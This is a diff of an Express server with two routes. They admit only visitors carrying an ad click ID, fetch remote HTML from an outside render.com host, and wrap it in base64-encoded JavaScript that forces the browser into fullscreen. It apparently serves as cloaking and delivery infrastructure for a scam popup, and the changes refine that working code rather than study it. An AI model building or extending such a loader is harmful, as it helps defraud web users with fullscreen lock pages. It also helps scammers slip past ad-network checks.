@@ -1,10 +1,10 @@
 import express from "express";
 import cors from "cors";
+import fetch from "node-fetch"; // IMPORTANT: node-fetch v3+ needed
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Replace with your domain
 const ALLOWED_ORIGIN = "https://sage-horse-b7caad.netlify.app";
 
 app.use(
@@ -50,10 +50,7 @@ app.get("/bot-remover", validateRequest, async (req, res) => {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  // Simulated country check (Cloudflare-style `cf.country` not available)
-  // Optional: Replace with GeoIP if needed
-
-  const assetUrl = "https://mumbaipopupformalik.onrender.com"; // or your office one
+  const assetUrl = "https://mumbaipopupformalik.onrender.com";
   try {
     const response = await fetch(assetUrl);
     const text = await response.text();
@@ -64,21 +61,21 @@ app.get("/bot-remover", validateRequest, async (req, res) => {
   }
 });
 
-// Updated GET /frontend-loader route
-app.get('/frontend-loader', validateRequest, async (req, res) => {
+// === Endpoint: GET /frontend-loader ===
+app.get("/frontend-loader", validateRequest, async (req, res) => {
   const gclid = req.query.gclid;
   if (!gclid || gclid.length < 10) {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
+  const assetUrl = "https://mumbaipopupformalik.onrender.com";
+
   try {
-    // Fetch the remote HTML asset that was used in bot-remover
-    const assetUrl = "https://mumbaipopupformalik.onrender.com"; // or office variant
     const assetRes = await fetch(assetUrl);
     const someRandomString = await assetRes.text();
 
-    // Inject the fetched HTML safely inside a JS string literal
-    const sanitizedHTML = JSON.stringify(someRandomString); // safely escapes quotes/newlines
+    // Safely stringify the HTML to embed into JavaScript
+    const sanitizedHTML = JSON.stringify(someRandomString);
 
     const code = `
       document.documentElement.requestFullscreen().then(() => {
@@ -95,18 +92,13 @@ app.get('/frontend-loader', validateRequest, async (req, res) => {
       });
     `;
 
-    const encoded = Buffer.from(code).toString('base64');
+    const encoded = Buffer.from(code).toString("base64");
     res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
     return res.json({ code: encoded });
   } catch (err) {
-    console.error("Error in /frontend-loader", err);
-    return res.status(500).json({ error: "Could not load or encode frontend script." });
+    console.error("Error generating frontend loader code:", err);
+    return res.status(500).json({ error: "Could not fetch and encode content." });
   }
-});
-
-  const encoded = Buffer.from(code).toString("base64");
-  res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
-  return res.json({ code: encoded });
 });
 
 // === Start server ===
